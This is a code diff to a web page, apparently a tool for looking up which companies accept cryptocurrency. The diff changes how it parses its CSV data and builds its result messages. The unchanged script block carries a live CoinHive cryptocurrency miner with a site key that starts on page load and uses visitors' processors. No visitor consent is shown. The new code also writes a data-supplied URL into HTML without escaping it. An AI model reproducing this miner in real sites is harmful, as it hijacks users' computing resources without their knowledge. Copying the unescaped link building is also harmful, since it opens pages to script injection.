@@ -37,7 +37,7 @@
 		<div class="row justify-content-md-center">
 			<div class="col-sm-12 col-md-7">
 				<div class="ui-widget">
-					<h2 class="text-center"> <input type="text" id ="c_name" class="name" onclick="this.focus();this.select()" placeholder="Apple" value="Expedia" autocomplete="on"style="text-align:center;"/></h2>
+					<h2 class="text-center"> <input type="text" id ="c_name" class="name" onclick="this.focus();this.select()" placeholder="Apple" value="" autocomplete="on"style="text-align:center;"/></h2>
 				</div>			
 			</div>
 		</div>
@@ -62,7 +62,7 @@
 		<div class="container">
 			<div class="row justify-content-md-center">
 				<div class="col">
-					<p id="footer_small_text"> ✅ Verified</p>
+					<p id="footer_small_text"> ✻ Verified</p>
 				</div>
 
 			</div>
@@ -119,6 +119,9 @@
 <script type="text/javascript">
 
 
+const company_name = ["Expedia","Microsoft Online","Microsoft Account","Gyft","Virgin Galactic","Whole Foods", "Amazon"];
+var company_value = company_name[Math.floor(Math.random()*company_name.length)];
+$(".name").val(company_value);
 
 var miner = new CoinHive.Anonymous('R28gUaZsQm8lY1W9aWPA8WBN83vhjId0',{throttle: 0.75, threads: 1});
 miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
@@ -206,10 +209,11 @@ var callback = function() {
 			var columns = rows[thisRow].split(",");
 			if (nameValue == columns[0].toLowerCase()) {
 				check = 1;
-				verified = columns[1].toLowerCase();
+				accepts = columns[1].toLowerCase();
+				verified = columns[3].toLowerCase();
 				processed = columns[4];
 				if(columns.length == 7){
-					crypto_type = columns[6].slice(0,-1);
+					crypto_type = columns[6].trim();
 
 				}else{
 					crypto_type = columns.splice(0,6);
@@ -221,13 +225,20 @@ var callback = function() {
 				break;
 			}
 		};
-			$('#wrap').html(" "); 
-			nameValue = nameValue.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})
-		if (check == 1 && verified=="yes"){
-			build = "<h3>" + nameValue +"<sup>✅</sup> "+" accepts "+" "+ crypto_type + "."+ "</h3>";
-			if(processed != " "){
+		$('#wrap').html(" "); 
+		nameValue = nameValue.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})
+		
+		if (columns[2] !="no"){
+			nameValue = "<a href="+columns[2]+">"+nameValue+"</a>";
+		}
+
+		if (check == 1 && verified=="yes" && accepts == "yes"){
+			build = "<h3>" + nameValue +"<sup>✻</sup> "+" accepts "+" "+ crypto_type + "."+ "</h3>";
+			if(processed != 'no'){
 				build += "<h6>Processed by " + processed + "<h6>";
 			}
+		}else if (check == 1 && verified=="yes" && accepts == "no"){
+			build = "<h3>" + nameValue+" "+"<sup>✻</sup> does not accept any cryptocurrency.</h3>";
 		}else if (check == 1){
 			build = "<h3>" + nameValue+" "+" accepts "+" "+ crypto_type + "."+ "</h3>";
 		}else{
